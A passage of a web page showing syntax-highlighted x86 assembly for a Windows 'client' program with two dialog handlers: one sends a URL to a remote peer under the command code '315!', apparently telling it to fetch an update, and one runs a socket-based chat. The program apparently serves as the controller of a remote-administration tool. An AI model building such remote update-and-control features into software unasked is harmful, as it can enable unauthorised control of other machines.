</span><span class="sc5">update_d</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hwnd2</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wmsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_CLOSE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">update_end</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc5">WM_COMMAND</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">update_command</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
</span><span class="sc5">update_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">update_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EndDialog</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">        
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">update_finish</span><span class="sc0">

</span><span class="sc5">update_start</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_UPDATE_URL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'315!'</span><span class="sc0"> 

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">

</span><span class="sc5">up_cmd_loop4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">up_cmd_loop4</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">update_finish</span><span class="sc0">

</span><span class="sc5">update_command</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_UPDATE_CANCEL</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">update_end</span><span class="sc0"> 
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_UPDATE_GO</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">update_start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">update_finish</span><span class="sc0">

</span><span class="sc5">update_d</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">update_d</span><span class="sc0">

</span><span class="sc5">chat_d</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">hwnd2</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wmsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">


    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc5">WM_INITDIALOG</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">chat_init</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc5">WM_SOCKET</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">chat_socket</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_CLOSE</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">chat_end</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc5">WM_COMMAND</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">chat_command</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
</span><span class="sc5">chat_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">chat_init</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FD_CONNECT</span><span class="sc4">+</span><span class="sc5">FD_CLOSE</span><span class="sc4">+</span><span class="sc5">FD_READ</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WM_SOCKET</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sockhandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WSAAsyncSelect</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">chat_finish</span><span class="sc0">


</span><span class="sc5">chat_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EndDialog</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">        
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chat_finish</span><span class="sc0">

</span><span class="sc5">chat_command</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_CHAT_CANCEL</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">chat_end</span><span class="sc0"> 
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc5">ID_CHAT_SEND</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">send_text</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">chat_finish</span><span class="sc0">

</span><span class="sc5">chat_socket</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Read_Buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sockhandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">recv</span><span class="sc0">    
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">skip_2</span><span class="sc0">
    
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Read_Buffer</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Read_Buffer</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Read_Buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">EM_REPLACESEL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CHAT_TAB</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SendDlgItemMessageA</span><span class="sc0">             

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Read_Buffer</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">skip_2</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">chat_finish</span><span class="sc0">


</span><span class="sc5">send_text</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Send_Buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CHAT_TEXT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Send_Buffer</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">13</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Send_Buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">EM_REPLACESEL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CHAT_TAB</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SendDlgItemMessageA</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Send_Buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sockhandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Send_Buffer</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Send_Buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CHAT_TEXT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetDlgItemTextA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">chat_finish</span><span class="sc0">


</span><span class="sc5">chat_d</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">public</span><span class="sc0"> </span><span class="sc5">chat_d</span><span class="sc0">



</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">client</span></div></body>
</html>
